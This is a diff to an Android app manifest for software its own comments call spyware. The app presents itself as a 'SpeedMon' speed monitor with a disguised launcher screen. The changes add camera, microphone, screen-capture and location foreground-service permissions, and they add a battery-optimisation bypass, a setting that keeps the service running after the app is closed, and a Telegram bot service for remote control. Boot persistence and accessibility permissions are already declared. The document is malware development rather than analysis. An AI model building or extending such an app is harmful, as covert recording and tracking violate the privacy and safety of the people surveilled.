@@ -16,6 +16,11 @@
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" tools:targetApi="tiramisu" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
@@ -23,6 +28,8 @@
     <uses-permission android:name="android.permission.GET_TASKS" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.BATTERY_STATS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
         android:name=".AgentApplication"
@@ -31,13 +38,16 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.SystemMonitor"
         android:usesCleartextTraffic="true"
-        android:extractNativeLibs="true">
+        android:extractNativeLibs="true"
+        android:hardwareAccelerated="true"
+        android:largeHeap="true">
 
         <!-- Main SpeedMon Activity (Disguised UI) -->
         <activity
             android:name=".speedmon.SpeedMonActivity"
             android:exported="true"
-            android:theme="@style/Theme.SpeedMon.NoActionBar">
+            android:theme="@style/Theme.SpeedMon.NoActionBar"
+            android:launchMode="singleTop">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -53,14 +63,23 @@
         <!-- Remote Control Activity -->
         <activity
             android:name=".admin.RemoteControlActivity"
-            android:exported="false" />
+            android:exported="false"
+            android:theme="@style/Theme.SpyAdmin.NoActionBar" />
 
         <!-- Main Spyware Service -->
         <service
             android:name=".AgentService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync|location|mediaProjection|microphone|camera" />
+            android:foregroundServiceType="dataSync|location|mediaProjection|microphone|camera"
+            android:stopWithTask="false" />
+
+        <!-- Telegram Bot Service -->
+        <service
+            android:name=".admin.TelegramBotService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
 
         <!-- Boot Receiver for Persistence -->
         <receiver
